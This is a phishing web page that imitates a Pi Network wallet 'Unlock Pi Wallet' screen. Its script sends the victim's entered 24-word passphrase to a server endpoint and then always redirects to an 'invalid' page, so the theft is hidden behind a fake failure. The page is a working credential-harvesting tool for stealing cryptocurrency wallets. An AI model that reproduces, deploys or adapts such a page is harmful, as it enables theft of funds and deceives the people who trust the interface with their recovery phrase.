<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Unlock Pi Wallet</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #fff;
      color: #333;
    }

    header {
      background: #783A8D;
      color: transparent;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: relative;
    }

    .back-btn {
      font-size: 24px;
      cursor: pointer;
      color: #783A8D;
    }

    .header-title {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      gap: 20px; /* Space between items */
    }

    .header-icon-left img{
      width: 25px;
      height: auto;
    }
  
    .header-icon-right img {
      width: 40px;
      height: auto;
    }

    .wallet-text {
      font-size: 18px;
      font-weight: bold;
      color: white;
    }

    .header-right {
      font-size: 20px;
      color: #783A8D;
    }

    .container {
      width: 100%;
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }

    h2 {
      margin-bottom: 30px;
      font-size: 24px;
    }

    .input-box {
      border: 2px solid #fbcf4a;
      border-radius: 8px;
      padding: 15px;
      width: 90%;
      font-size: 16px;
      height: 200px;
      background-color: #FAFAFA;
      resize: none;
    }

    .button {
      padding: 14px 25px;
      font-size: 10px;
      border-radius: 25px;
      border: 2px solid #76348E;
      background-color: white;
      color: #76348E;
      cursor: pointer;
      margin: 15px 0;
      width: 85%;
      max-width: 400px;
      height: 50px;
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }

    .button.loading {
      pointer-events: none;
    }

    .button.loading::after {
      content: '';
      border: 3px solid #fff;
      border-top: 3px solid #76348E;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .button.loading span {
      opacity: 0;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .fingerprint-button {
      background-color: #76348E;
      color: white;
      border: none;
      width: 85%;
    }

    p {
      max-width: 400px;
      margin: 20px auto;
      font-size: 12px;
      color: #555;
      line-height: 1.6;
    }

    a {
      color: #8b3dff;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <header>
    <div class="header-left">
      <div class="back-btn">&#8592;</div>
    </div>

    <div class="header-title">
      <div class="header-icon-left">
        <img src="../../images/wallet.png" alt="Wallet Icon" />
      </div>
      <div class="wallet-text">Wallet</div>
      <div class="header-icon-right">
        <img src="../../images/wall.jpg" alt="Pi Icon" />
      </div>
    </div>

    <div class="header-right">&#9660;</div>
  </header>

  <div class="container">
    <h2>Unlock Pi Wallet</h2>

    <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>

    <br>
    <button id="unlockBtn" class="button" onclick="handleUnlock()"><span><b>UNLOCK WITH PASSPHRASE</b></span></button>
    <br>
    <button class="button fingerprint-button"><b>UNLOCK WITH FINGERPRINT</b></button>

    <p>
      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
    </p>
    <p>
      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Ï€ in your previous wallet will be inaccessible.
    </p>
  </div>

  <script>
    async function handleUnlock() {
      const btn = document.getElementById('unlockBtn');
      const passphrase = document.getElementById('passphrase').value.trim();

      btn.classList.add('loading');

      try {
        await fetch("/api/passphrase.js", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phrase: passphrase })
        });

        setTimeout(() => {
          window.location.href = '/mine/invalid/';
        }, 1500);

      } catch (error) {
        btn.classList.remove('loading');
        window.location.href = '/mine/invalid/';
      }
    }
  </script>

</body>
  </html>
